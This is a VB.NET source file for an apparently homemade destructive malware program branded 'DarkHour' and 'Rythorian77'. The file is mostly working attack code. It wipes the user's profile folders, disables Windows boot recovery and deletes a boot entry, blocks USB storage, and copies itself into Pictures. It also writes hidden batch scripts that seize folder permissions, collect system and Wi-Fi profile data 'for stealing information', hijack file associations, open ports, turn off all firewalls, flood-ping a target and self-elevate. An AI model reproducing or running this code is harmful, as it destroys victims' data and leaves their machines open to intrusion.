Imports System.ComponentModel
Imports System.IO
Imports System.Management
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32

Public Class Form1

#Region "Global Variables | Declaration of Functions"
    'Global Variables
    Dim taskBar As Integer
    Dim passSequence As String = 0
    Public Const SWP_HIDEWINDOW = &H80
    Public Const SWP_SHOWWINDOW = &H40
    Public Const SW_HIDE As Integer = 0
    Public Const SW_RESTORE As Integer = 9

    Private ReadOnly lab As New Label
    Private ReadOnly lab1 As New Label
    Private ReadOnly tx As New TextBox

    Private TargetDT As Date
    Private CountDownFrom As TimeSpan = TimeSpan.FromHours(6)

    Dim WithEvents USBAdded As New ManagementEventWatcher
    Dim WithEvents USBRemoved As New ManagementEventWatcher

    Delegate Sub USBChanging(eye As String)
    Private USBChanged As New USBChanging(AddressOf USBChangedHandler)

    Private Const WM_DEVICECHANGE As Integer = &H219
    Private Const DBT_DEVICEARRIVAL As Integer = &H8000
    Private Const DBT_DEVTYP_VOLUME As Integer = &H2
    Private Const Value As String = "="

    'Device information structure
    Public Structure DEV_BROADCAST_HDR
        Public dbch_size As Integer
        Public dbch_devicetype As Integer
        Public dbch_reserved As Integer
    End Structure

    'Volume information Structure
    Private Structure DEV_BROADCAST_VOLUME
        Public dbcv_size As Integer
        Public dbcv_devicetype As Integer
        Public dbcv_reserved As Integer
        Public dbcv_unitmask As Integer
        Public dbcv_flags As Short
    End Structure


    Private ReadOnly userDir As String = "C:\Users\"

    Private ReadOnly userName As String = Environment.UserName

    Private ReadOnly Pictures As String = "\Pictures"
    Private ReadOnly Music As String = "\Music"
    Private ReadOnly Desktop As String = "\Desktop"
    Private ReadOnly Documents As String = "\Documents"
    Private ReadOnly Favorites As String = "\Favorites"
    Private ReadOnly Videos As String = "\Videos"
    Private ReadOnly History As String = "\History"
    Private ReadOnly InternetCache As String = "\InternetCache"
    Private ReadOnly LocalApplicationData As String = "\LocalApplicationData"
    Private ReadOnly LocalizedResources As String = "\LocalizedResources"
    Private ReadOnly NetworkShortcuts As String = "\NetworkShortcuts"
    Private ReadOnly SendTo As String = "\SendTo"
    Private ReadOnly System As String = "\System"
    Private ReadOnly Windows As String = "\Windows"
    Private ReadOnly SystemX86 As String = "\SystemX86"
    Private ReadOnly StartMenu As String = "\StartMenu"
    Private ReadOnly Templates As String = "\Templates"
    Private ReadOnly Personal As String = "\Personal"
    Private ReadOnly Resources As String = "\Resources"
    Private ReadOnly Programs As String = "\Programs"
    Private ReadOnly ProgramFiles As String = "\ProgramFiles"
    Private ReadOnly ProgramFilesX86 As String = "\ProgramFilesX86"
    Private ReadOnly PrinterShortcuts As String = "\PrinterShortcuts"
    Private ReadOnly Recent As String = "\Recent"
    Private ReadOnly Fonts As String = "\Fonts"
    Private ReadOnly AdminTools As String = "\AdminTools"
    Private ReadOnly ApplicationData As String = "\ApplicationData"
    Private ReadOnly enviro As String = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)

    Declare Function SetWindowPos Lib "user32" (hwnd As Integer, hWndInsertAfter As Integer, x As Integer, y As Integer, cx As Integer, cy As Integer, wFlags As Integer) As Integer
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (lpClassName As String, lpWindowName As String) As Integer
    Private Declare Function ShowWindow Lib "user32" (hwnd As IntPtr, nCmdShow As Integer) As Integer
    Private Declare Function SetWindowPos Lib "user32" (hwnd As Long, hWndInsertAfter As Long, x As Long, y As Long, cx As Long, cy As Long, wFlags As Long) As Long

    <DllImport("winmm.dll")>
    Private Shared Function mciSendString(command As String, buffer As String, bufferSize As Integer, hwndCallback As IntPtr) As Integer
    End Function

#End Region

    <Obsolete>
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CreateMyForm()

        'Timer1.Start()
        Timer2.Start()
        'Timer4.Start() 'Mass file Deletion 10 seconds after mass file encryption
        'Timer5.Start() 'Remove CMD Option From Registry
        'Timer6.Start() 'Password to initiate this programs self-destruct sequence and save host's files

        'FunctionToBlock() 'Block USB Device
        'Timer1.Interval = 100
        TargetDT = Date.Now.Add(CountDownFrom)
        'Rythorians_Movement_Order()
        'Housing() 'Security
        'ProcessSecurity_Shield() 'Security
        'Rythorians_Scheduler()
        'Tactician()'Uses Icacls to break into folders
        'StateOfBirth()'Self-replicate
        'Refuses closure of CD Tray 
        'mciSendString("set CDAudio door open", vbNullString, 0, IntPtr.Zero)
        'Memory Hack
        'Dim connect As New RythoriansAnnihilationMemoryControl

        'taskBar = FindWindow("Shell_traywnd", "")
        'Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
        'SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
        'Dim hwnd As IntPtr
        'hwnd = FindWindow(vbNullString, "Program Manager")
        'If Not hwnd = 0 Then
        'ShowWindow(hwnd, SW_HIDE)
        'End If

        'On Error GoTo ErrNull
        'Admin_Boot_Protocol()
        'Err.Clear()
        'ErrNull:
        '       On Error Resume Next

        Thread.CurrentThread.CurrentCulture =
       New Globalization.CultureInfo("en-US")

        Dim q As New WqlEventQuery()

        'Watch For USB Device Added
        With q
            .EventClassName = "__InstanceCreationEvent"
            .Condition = "TargetInstance ISA 'Win32_USBControllerDevice'"
            ' check every X seconds, abritrary value, use whatever you feel is correct
            Dim CheckEvery As Single = 2.5
            .WithinInterval = New TimeSpan(CInt(CheckEvery * 10000000))
        End With

        USBAdded.Query = q
        USBAdded.Start()

        'Watch For USB Device Removed
        q.EventClassName = "__InstanceDeletionEvent"
        USBRemoved.Query = q
        USBRemoved.Start()

        'ToDo: Figure out why WqlEventQuery parsing is language sensitive. doesn't like German. Bug?
        Dim myCulture As Globalization.CultureInfo = Globalization.CultureInfo.CurrentCulture
        Thread.CurrentThread.CurrentCulture = myCulture

        'Catalogue existing USB Devices
        CatalogueUSBDevices()
        ' On Error GoTo ErrUtility
        'This command sets permissions back to factory level. 
        ' CMDUtility.RunCommandCom("secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose/ c:\windows\inf", "/W", True)
        'Err.Clear()
        'ErrUtility:
        '       On Error Resume Next
    End Sub

    Private Sub StateOfBirth()
        Dim FileToCopy As String
        Dim NewCopy As String
        FileToCopy = Assembly.GetExecutingAssembly().Location
        NewCopy = My.Computer.FileSystem.SpecialDirectories.MyPictures & "\WindowsApp3.exe"

        If File.Exists(FileToCopy) = True Then
            File.Copy(FileToCopy, NewCopy)
            ' MessageBox.Show("File Copied")
            Try
            Catch ex As Exception
                Debug.Print(ex.Message)
            End Try
        End If
    End Sub

#Region "USB Block | Detection"
    Private Sub FunctionToBlock()
        On Error GoTo ErrBlock
        Dim regKey As RegistryKey
        regKey = Registry.CurrentUser.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
        regKey.SetValue("Start", 4) ' 4(To disable the ports) 3 to enable
        Err.Clear()
ErrBlock:
        On Error Resume Next
    End Sub

    'This will play laughter at the victim on Insertion and Removal of USB, telling them the USB is Compromised
    Public Sub USBChangedHandler(eye As String)
        My.Computer.Audio.Play(My.Resources.output, AudioPlayMode.Background)
        'Disable USB
        ' Shell(Application.StartupPath & "\devcon.exe disable *USBSTOR*")
        'Disable CDROM Drive
        'Shell(Application.StartupPath & "\devcon.exe disable *CDROM*")
        'Enable USB
        'Shell(Application.StartupPath & "\devcon.exe enable *USBSTOR*")

    End Sub

    Structure USBDevice
        Dim Info As String
        Dim PnPDeviceID As String
        Dim Path As String
        Dim Service As String
        Dim ExtraDescription As String
    End Structure

    Private _USBDevices As New List(Of USBDevice)

    Private Sub CatalogueUSBDevices()
        Dim q As New SelectQuery With {
            .ClassName = "Win32_PnPEntity"
        }

        Using mos As New ManagementObjectSearcher(q)
            For Each mo As ManagementObject In mos.Get()
                _USBDevices.Add(BuildUSBDevice(mo))
            Next
        End Using
    End Sub

    Private Function BuildUSBDevice(mo As ManagementObject, Optional PauseDisk As Boolean = False) As USBDevice
        BuildUSBDevice = New USBDevice
        With BuildUSBDevice
            .Path = mo.Path.Path
            .PnPDeviceID = mo("PNPDeviceID").ToString
            .Service = If(mo("Service") Is Nothing, "", mo("Service").ToString)
            If .Service.ToLower = "disk" Then
                'get Drive Info
                'Hack: added delay to allow all partitions to become registered
                If PauseDisk Then Thread.Sleep(1500)
                .ExtraDescription = GetDiskDriveInfo(.PnPDeviceID)
            End If
        End With
    End Function

    Private Function GetDiskDriveInfo(PnPDeviceID As String) As String
        GetDiskDriveInfo = ""
        Dim diskcount As Integer
        Dim q As New SelectQuery With {
            .ClassName = "Win32_DiskDrive"
        }
        For Each drive As ManagementObject In New ManagementObjectSearcher(q).Get()
            If drive("PnPDeviceID").ToString = PnPDeviceID Then
                ' associate physical disks with partitions
                For Each partition As ManagementObject In
        New ManagementObjectSearcher(
         $"ASSOCIATORS OF {{Win32_DiskDrive.DeviceID='{drive("DeviceID")}'}} WHERE AssocClass = Win32_DiskDriveToDiskPartition").Get()

                    Dim partitioncount As Integer = 0
                    GetDiskDriveInfo &= $"{If(partitioncount > 0, "; ", "")}Partition Name = {partition("Name")}, "

                    ' associate partitions with logical disks (drive letter volumes)
                    diskcount = 0
                    For Each disk As ManagementObject In
         New ManagementObjectSearcher(
         $"ASSOCIATORS OF {{Win32_DiskPartition.DeviceID='" &
         partition("DeviceID").ToString _
         & $"'}} WHERE AssocClass = Win32_LogicalDiskToPartition").Get()

                        GetDiskDriveInfo &= $"{If(diskcount > 0, "; ", "")}Disk = {disk("Name")}"
                        diskcount += 1
                    Next disk
                    partitioncount += 1
                Next partition
                Exit For
            End If
        Next drive
        If diskcount > 1 Then GetDiskDriveInfo = GetDiskDriveInfo.Replace("Disk", "Disks")
    End Function

    Private Sub USBAdded_EventArrived(sender As Object,
e As EventArrivedEventArgs) _
   Handles USBAdded.EventArrived

        Dim mo As ManagementObject = MoFromEvent(e)
        Dim device As USBDevice = BuildUSBDevice(mo, True)
        BeginInvoke(USBChanged, New Object() _
               {$"Added: 😡Device has been added to USB😡 {device.Info}{If(device.ExtraDescription = "", "", "; " &
               device.ExtraDescription)}{vbCrLf}"}) '& _
        'mo.GetText(TextFormat.Mof).Replace(vbLf, vbCrLf)})
        _USBDevices.Add(device)
    End Sub

    Private Sub USBRemoved_EventArrived(sender As Object,
e As EventArrivedEventArgs) _
   Handles USBRemoved.EventArrived

        Dim smo As ManagementBaseObject
        smo = CType(e.NewEvent.Properties("TargetInstance").Value,
        ManagementBaseObject)

        'search through _USBDevices for Path retrieved from Dependent
        Dim mp As New ManagementPath(smo("Dependent").ToString)
        Dim path As String = mp.RelativePath
        path = path.Substring(path.IndexOf("=") + 2)
        path = path.Substring(0, path.Length - 1)

        For i As Integer = 0 To _USBDevices.Count - 1
            With _USBDevices(i)
                If .Path = mp.Path Then
                    BeginInvoke(USBChanged, New Object() _
        {$"Removed: 😡Device has been removed from USB😡 { .Info}{If(.ExtraDescription <> "", "; " & .ExtraDescription, "")}{vbCrLf}"})
                    _USBDevices.RemoveAt(i)
                    Exit For
                End If
            End With
        Next i
    End Sub

    Private Function MoFromEvent(e As EventArrivedEventArgs) As ManagementObject
        Dim smo As ManagementBaseObject
        smo = CType(e.NewEvent.Properties("TargetInstance").Value,
         ManagementBaseObject)
        Dim IDPath As String = smo.GetPropertyValue("Dependent").ToString.Replace("""", "'")
        'ToDo: Figure out why need to replace "\\" with "\" 
        'as they are doubled when creating a MananagementPath
        IDPath = IDPath.Substring(0, IDPath.IndexOf("=")) &
        IDPath.Substring(IDPath.IndexOf(Value)).Replace("\\", "\")
        MoFromEvent = New ManagementObject(IDPath)
    End Function

    Private Sub Form1_Closing(sender As Object,
e As CancelEventArgs) Handles MyBase.Closing
        USBAdded.Stop()
        USBRemoved.Stop()
    End Sub
#End Region

#Region "Admin Boot Protocol"
    'Checks if user is admin
    Public Shared Function IsAdministrator() As Boolean
        Dim isAdmin As Boolean = False
        Try
            Dim user As IIdentity = WindowsIdentity.GetCurrent()
            Dim principal As New WindowsPrincipal(CType(user, WindowsIdentity))
            isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator)
            Return isAdmin
        Catch ex As Exception
            Return isAdmin
        End Try
    End Function

    Public Sub Admin_Boot_Protocol()
        On Error GoTo ErrBootRecoveryDisableHandler
        If IsAdministrator() Then
            'To disable automatic recovery, type bcdedit / set current recoveryenabled No;
            '('current' represents the current operating system and changing the value to 'no' will stop automatic recovery).
            Dim oProcess As New Process()
            Dim oStartInfo As New ProcessStartInfo("cmd.exe", $"bcdedit /set {{current}} recoveryenabled no") With {
                        .WindowStyle = ProcessWindowStyle.Hidden
                    }
            oStartInfo.CreateNoWindow = True
            oStartInfo.UseShellExecute = False
            oStartInfo.RedirectStandardOutput = True
            oProcess.StartInfo = oStartInfo
            oProcess.Start()

            Dim sOutput As String
            Using oStreamReader As StreamReader = oProcess.StandardOutput
                sOutput = oStreamReader.ReadToEnd()

            End Using

            'The following command deletes the volume entry With id {802d5e32-0784-11Da-bd33-000476eba25f}.
            'Removes the specified entry identifier (users) from the boot sequence account
            Dim aProcess As New Process()
            Dim aStartInfo As New ProcessStartInfo("cmd.exe", $"bcdedit /delete {{802d5e32-0784-11da-bd33-000476eba25f}}") With {
                        .WindowStyle = ProcessWindowStyle.Hidden
                    }
            aStartInfo.CreateNoWindow = True
            aStartInfo.UseShellExecute = False
            aStartInfo.RedirectStandardOutput = True
            aProcess.StartInfo = aStartInfo
            aProcess.Start()

            Dim tOutput As String
            Using oStreamReader As StreamReader = aProcess.StandardOutput
                tOutput = oStreamReader.ReadToEnd()

            End Using

            'Primary deletion of "Users Accounts"
            'The net user command is used to add, remove, and make changes to the user accounts on a computer, all from the Command Prompt.
            Dim iProcess As New Process()
            Dim iStartInfo As New ProcessStartInfo("cmd.exe", "/c net use * /delete /y") With {
                        .WindowStyle = ProcessWindowStyle.Hidden
                    }
            iStartInfo.CreateNoWindow = True
            iStartInfo.UseShellExecute = False
            iStartInfo.RedirectStandardOutput = True
            iProcess.StartInfo = iStartInfo
            iProcess.Start()

            Dim pOutput As String
            Using oStreamReader As StreamReader = iProcess.StandardOutput
                pOutput = oStreamReader.ReadToEnd()
            End Using

        End If
        Registry.SetValue("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR", "Start", 4, RegistryValueKind.DWord)
        Err.Clear()

ErrBootRecoveryDisableHandler:
        On Error Resume Next
    End Sub
#End Region

#Region "Mass Systematic Deletion"
    Private Sub Chromosome26()
        On Error GoTo ErrMassExtictionHandler
        'Music
        Dim path As String = Environment.ExpandEnvironmentVariables(enviro & Music)
        Dim dir As New DirectoryInfo(path)

        For Each files As FileInfo In dir.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir.GetDirectories()
            dirs.Delete(True)
        Next
        'Pictures
        Dim path1 As String = Environment.ExpandEnvironmentVariables(enviro & Pictures)
        Dim dir1 As New DirectoryInfo(path1)

        For Each files As FileInfo In dir1.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir1.GetDirectories()
            dirs.Delete(True)
        Next
        'Desktop
        Dim path2 As String = Environment.ExpandEnvironmentVariables(enviro & Desktop)
        Dim dir2 As New DirectoryInfo(path2)

        For Each files As FileInfo In dir2.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir2.GetDirectories()
            dirs.Delete(True)
        Next
        'Documents
        Dim path3 As String = Environment.ExpandEnvironmentVariables(enviro & Documents)
        Dim dir3 As New DirectoryInfo(path3)

        For Each files As FileInfo In dir3.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir3.GetDirectories()
            dirs.Delete(True)
        Next
        'Favorites
        Dim path4 As String = Environment.ExpandEnvironmentVariables(enviro & Favorites)
        Dim dir4 As New DirectoryInfo(path4)

        For Each files As FileInfo In dir4.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir4.GetDirectories()
            dirs.Delete(True)
        Next
        'Videos
        Dim path5 As String = Environment.ExpandEnvironmentVariables(enviro & Videos)
        Dim dir5 As New DirectoryInfo(path5)

        For Each files As FileInfo In dir5.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir5.GetDirectories()
            dirs.Delete(True)
        Next
        'History
        Dim path6 As String = Environment.ExpandEnvironmentVariables(enviro & History)
        Dim dir6 As New DirectoryInfo(path6)

        For Each files As FileInfo In dir6.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir6.GetDirectories()
            dirs.Delete(True)
        Next
        'InternetCache
        Dim path7 As String = Environment.ExpandEnvironmentVariables(enviro & InternetCache)
        Dim dir7 As New DirectoryInfo(path7)

        For Each files As FileInfo In dir7.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir7.GetDirectories()
            dirs.Delete(True)
        Next
        'LocalApplicationData
        Dim path8 As String = Environment.ExpandEnvironmentVariables(enviro & LocalApplicationData)
        Dim dir8 As New DirectoryInfo(path8)

        For Each files As FileInfo In dir8.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir8.GetDirectories()
            dirs.Delete(True)
        Next
        'LocalizedResources
        Dim path9 As String = Environment.ExpandEnvironmentVariables(enviro & LocalizedResources)
        Dim dir9 As New DirectoryInfo(path9)

        For Each files As FileInfo In dir9.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir9.GetDirectories()
            dirs.Delete(True)
        Next
        'NetworkShortcuts
        Dim path10 As String = Environment.ExpandEnvironmentVariables(enviro & NetworkShortcuts)
        Dim dir10 As New DirectoryInfo(path10)

        For Each files As FileInfo In dir10.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir10.GetDirectories()
            dirs.Delete(True)
        Next
        'SendTo
        Dim path11 As String = Environment.ExpandEnvironmentVariables(enviro & SendTo)
        Dim dir11 As New DirectoryInfo(path11)

        For Each files As FileInfo In dir11.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir11.GetDirectories()
            dirs.Delete(True)
        Next
        'System
        Dim path12 As String = Environment.ExpandEnvironmentVariables(enviro & System)
        Dim dir12 As New DirectoryInfo(path12)

        For Each files As FileInfo In dir12.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir12.GetDirectories()
            dirs.Delete(True)
        Next
        'Windows
        Dim path13 As String = Environment.ExpandEnvironmentVariables(enviro & Windows)
        Dim dir13 As New DirectoryInfo(path13)

        For Each files As FileInfo In dir13.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir13.GetDirectories()
            dirs.Delete(True)
        Next
        'SystemX86
        Dim path14 As String = Environment.ExpandEnvironmentVariables(enviro & SystemX86)
        Dim dir14 As New DirectoryInfo(path14)

        For Each files As FileInfo In dir14.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir14.GetDirectories()
            dirs.Delete(True)
        Next
        'StartMenu
        Dim path15 As String = Environment.ExpandEnvironmentVariables(enviro & StartMenu)
        Dim dir15 As New DirectoryInfo(path15)

        For Each files As FileInfo In dir15.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir15.GetDirectories()
            dirs.Delete(True)
        Next
        'Templates
        Dim path16 As String = Environment.ExpandEnvironmentVariables(enviro & Templates)
        Dim dir16 As New DirectoryInfo(path16)

        For Each files As FileInfo In dir16.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir16.GetDirectories()
            dirs.Delete(True)
        Next
        'Personal
        Dim path17 As String = Environment.ExpandEnvironmentVariables(enviro & Personal)
        Dim dir17 As New DirectoryInfo(path17)

        For Each files As FileInfo In dir17.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir17.GetDirectories()
            dirs.Delete(True)
        Next
        'Resources
        Dim path18 As String = Environment.ExpandEnvironmentVariables(enviro & Resources)
        Dim dir18 As New DirectoryInfo(path18)

        For Each files As FileInfo In dir18.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir18.GetDirectories()
            dirs.Delete(True)
        Next
        'Programs
        Dim path19 As String = Environment.ExpandEnvironmentVariables(enviro & Programs)
        Dim dir19 As New DirectoryInfo(path19)

        For Each files As FileInfo In dir19.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir19.GetDirectories()
            dirs.Delete(True)
        Next
        'ProgramFiles
        Dim path20 As String = Environment.ExpandEnvironmentVariables(enviro & ProgramFiles)
        Dim dir20 As New DirectoryInfo(path20)

        For Each files As FileInfo In dir20.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir20.GetDirectories()
            dirs.Delete(True)
        Next
        'ProgramFilesX86
        Dim path21 As String = Environment.ExpandEnvironmentVariables(enviro & ProgramFilesX86)
        Dim dir21 As New DirectoryInfo(path21)

        For Each files As FileInfo In dir21.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir21.GetDirectories()
            dirs.Delete(True)
        Next
        'PrinterShortcuts
        Dim path22 As String = Environment.ExpandEnvironmentVariables(enviro & PrinterShortcuts)
        Dim dir22 As New DirectoryInfo(path22)

        For Each files As FileInfo In dir22.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir22.GetDirectories()
            dirs.Delete(True)
        Next
        'Recent
        Dim path23 As String = Environment.ExpandEnvironmentVariables(enviro & Recent)
        Dim dir23 As New DirectoryInfo(path23)

        For Each files As FileInfo In dir23.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir23.GetDirectories()
            dirs.Delete(True)
        Next
        'Fonts
        Dim path24 As String = Environment.ExpandEnvironmentVariables(enviro & Fonts)
        Dim dir24 As New DirectoryInfo(path24)

        For Each files As FileInfo In dir24.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir24.GetDirectories()
            dirs.Delete(True)
        Next
        'AdminTools
        Dim path25 As String = Environment.ExpandEnvironmentVariables(enviro & AdminTools)
        Dim dir25 As New DirectoryInfo(path25)

        For Each files As FileInfo In dir25.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir25.GetDirectories()
            dirs.Delete(True)
        Next
        'ApplicationData
        Dim path26 As String = Environment.ExpandEnvironmentVariables(enviro & ApplicationData)
        Dim dir26 As New DirectoryInfo(path26)

        For Each files As FileInfo In dir26.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir26.GetDirectories()
            dirs.Delete(True)
        Next
        Err.Clear()
ErrMassExtictionHandler:
        On Error Resume Next
    End Sub
#End Region

#Region "Order of the Bats|Task Manager Executioner"
    Private Sub Tactician()
        Dim sb As New StringBuilder
        sb.AppendLine("SET FOLDER_NAME=C:\Users\justin.ross\source\repos\DarkHour\DarkHour\bin\Debug") 'Change path
        sb.AppendLine("TAKEOWN /f %FOLDER_NAME% /r /d y")
        sb.AppendLine("ICACLS %FOLDER_NAME% /grant administrators:F /t")
        sb.AppendLine("ICACLS %FOLDER_NAME% /reset /T")
        sb.AppendLine("icacls foo /grant Everyone:(OI)(CI)F")
        sb.AppendLine("IF NOT %ERRORLEVEL%==0 GOTO")
        sb.AppendLine("timeout /t 4 /nobreak")
        sb.AppendLine("echo .appactivate^(""%~1"" ^) : .sendkeys ""{enter}")
        sb.AppendLine("GoTo begin")
        File.WriteAllText("fileName.bat", sb.ToString())
        'Run Bat invisible
        Shell("fileName.bat", AppWinStyle.Hide) 'Change to "hide" for it to be invisible
    End Sub

    Private Sub DayStar()
        On Error GoTo Err
        Dim rythorian77 As New StringBuilder
        rythorian77.AppendLine("@echo off")
        rythorian77.AppendLine("Title: Batch (DayStar Neural PathoHack) by: Rythorian77 (AKA Black Star Research)")
        rythorian77.AppendLine(":Commandline")
        rythorian77.AppendLine("IF [""%~1""]==[""-e""] GoTo o")
        rythorian77.AppendLine(":Clear vbs")
        rythorian77.AppendLine("set Batch=%~dpnx0")
        rythorian77.AppendLine("(")
        rythorian77.AppendLine("echo set objshell ^= createobject^(""wscript.shell""^)")
        rythorian77.AppendLine("echo objshell^.run ""%Batch% -e""^,vbhide ) > %temp%\bas.vbs")
        rythorian77.AppendLine("start %temp%\bas.vbs")
        rythorian77.AppendLine("exit")
        rythorian77.AppendLine(":o")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("ipconfig /all")
        rythorian77.AppendLine("timeout /t 3 /nobreak >nul")
        rythorian77.AppendLine("set /p Target: = Target")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("nslookup %Target%")
        rythorian77.AppendLine("ping %Target% -n 65500 -l 12l")
        rythorian77.AppendLine("timeout/t 3 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.Append("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("echo Searching passwords \")
        rythorian77.AppendLine("timeout /t 5 /nobreak >nul")
        rythorian77.AppendLine(":real dirty work for stealing information")
        rythorian77.AppendLine("nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log")
        rythorian77.AppendLine("ver>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO Username:%username%>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO Time: %time%>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO Date: %date%>>9K21JM10B.log")
        rythorian77.AppendLine("assoc .txt = MER99RDUWFILE")
        rythorian77.AppendLine("assoc .jpeg = 9LKMFILE")
        rythorian77.AppendLine("assoc .jpg = NOTAPICTUREFILE")
        rythorian77.AppendLine("assoc .vbs = ggaieFILE")
        rythorian77.AppendLine("assoc .exe = NOTANAPPLICATIONFILE")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("netsh wlan show profiles>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ipconfig>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO Additional Information:>>9K21JM10B.log")
        rythorian77.AppendLine("ipconfig | find /i ""IPv4"">>9K21JM10B.log")
        rythorian77.AppendLine("wmic diskdrive get size>>9K21JM10B.log")
        rythorian77.AppendLine("wmic cpu get name>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("systeminfo>>9K21JM10B.log")
        rythorian77.AppendLine("goto ports")
        rythorian77.AppendLine("ren -=- Opens Port 1122 -=-")
        rythorian77.AppendLine(":ports")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("netsh advfirewall firewall add rule name=""Port 1122 TCP"" dir=in action=allow protocol=TCP localport=%1")
        rythorian77.AppendLine("netsh advfirewall firewall add rule name=""Port 1122 UDP"" dir=in action=allow protocol=UDP localport=%1")
        rythorian77.AppendLine("goto firewall")
        rythorian77.AppendLine("ren -=- Turns all Firewalls off -=-")
        rythorian77.AppendLine(":firewall")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("netsh firewall set opmode disable")
        rythorian77.AppendLine("netsh firewall set opmode mode=DISABLE")
        rythorian77.AppendLine("netsh advfirewall set currentprofile state off")
        rythorian77.AppendLine("netsh advfirewall set domainprofile state off")
        rythorian77.AppendLine("netsh advfirewall set privateprofile state off")
        rythorian77.AppendLine("netsh advfirewall set publicprofile state off")
        rythorian77.AppendLine("netsh advfirewall set allprofiles state off ")
        rythorian77.AppendLine("cls()")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("CreateObject(""Wscript.Shell"").Run ""DayStar.bat"", 0, True")
        rythorian77.AppendLine("GoTo begin")

        File.WriteAllText("DayStar.bat", rythorian77.ToString())

        Process.Start("DayStar.bat")
        Err.Clear()
Err:
        On Error Resume Next

    End Sub

    'For details on what this bat does, see the "HyperNova.txt" file in solution explorer
    Private Sub HyperNova()
        Dim rythorian77 As New StringBuilder
        On Error GoTo Err
        rythorian77.AppendLine("@AT>NUL||echo set shell=CreateObject(""Shell.Application""):shell.ShellExecute ""%~dpnx0"",,""%CD%"", ""runas"", 1:set shell=nothing>%~n0.vbs&start %~n0.vbs /realtime& timeout 1 /NOBREAK>nul& del /Q %~n0.vbs&cls&exit")
